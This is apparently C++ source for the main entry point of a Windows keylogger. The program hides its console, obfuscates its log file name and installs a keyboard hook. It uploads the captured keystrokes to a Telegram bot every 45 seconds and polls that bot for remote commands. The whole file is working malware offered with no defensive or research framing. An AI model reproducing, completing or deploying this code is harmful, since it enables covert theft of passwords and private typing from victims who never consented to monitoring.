#include <windows.h>
#include <thread>
#include <chrono>
#include <fstream>
#include "ConfigManager.h"
#include "TelegramBot.h"
#include "Keylogger.h"
#include "obfuscate.h" // Include the obfuscation header

// Global flag to control the keylogger's running state.
// This is a simplification for now and could be improved.
bool isRunning = true;

const std::string LOG_FILE_NAME = OBFUSCATE("log.txt");

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // --- START DEBUG LOGGING ---
    std::ofstream startup_log("startup_log.txt", std::ios::out | std::ios::trunc);
    if (startup_log.is_open()) {
        startup_log << "Application started." << std::endl;
        startup_log.close();
    }
    // --- END DEBUG LOGGING ---

    FreeConsole(); // Detach from console

    // Get the path to the executable
    char exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);
    std::string::size_type pos = std::string(exePath).find_last_of("\\/");
    std::string configPath = std::string(exePath).substr(0, pos) + "\\" + "config.ini";

    // Load configuration
    ConfigManager config(configPath);
    if (config.getBotToken().empty() || config.getChatID().empty()) {
        // --- START DEBUG LOGGING ---
        std::ofstream error_log("startup_log.txt", std::ios::app);
        if (error_log.is_open()) {
            error_log << "Configuration is missing. Exiting." << std::endl;
            error_log.close();
        }
        // --- END DEBUG LOGGING ---
        return 1; // Exit if configuration is missing
    }

    // Initialize components
    TelegramBot bot(config.getBotToken(), config.getChatID());
    Keylogger keylogger(LOG_FILE_NAME, &bot);
    bot.setKeylogger(&keylogger);

    // Clear log file at startup
    std::ofstream logfile(LOG_FILE_NAME, std::ios::out | std::ios::trunc);
    logfile.close();

    // Start the keylogger hook
    keylogger.start();

    // --- START DEBUG LOGGING ---
    std::ofstream running_log("startup_log.txt", std::ios::app);
    if (running_log.is_open()) {
        running_log << "Keylogger started and threads are being created." << std::endl;
        running_log.close();
    }
    // --- END DEBUG LOGGING ---

    // Start a separate thread to send logs periodically
    std::thread telegramSenderThread([&]() {
        while (true) {
            std::this_thread::sleep_for(std::chrono::seconds(45));
            std::ifstream logfile_stream(LOG_FILE_NAME);
            std::string logContent((std::istreambuf_iterator<char>(logfile_stream)), std::istreambuf_iterator<char>());
            logfile_stream.close();

            if (!logContent.empty()) {
                bot.sendLog(logContent);
                // Clear log file after sending
                std::ofstream clear_logfile(LOG_FILE_NAME, std::ios::out | std::ios::trunc);
                clear_logfile.close();
            }
        }
    });
    telegramSenderThread.detach();

    // Start a separate thread to check for Telegram commands
    std::thread commandThread([&]() {
        while (true) {
            std::this_thread::sleep_for(std::chrono::seconds(15));
            bot.checkCommands();
        }
    });
    commandThread.detach();

    // Message loop to keep the hook active
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
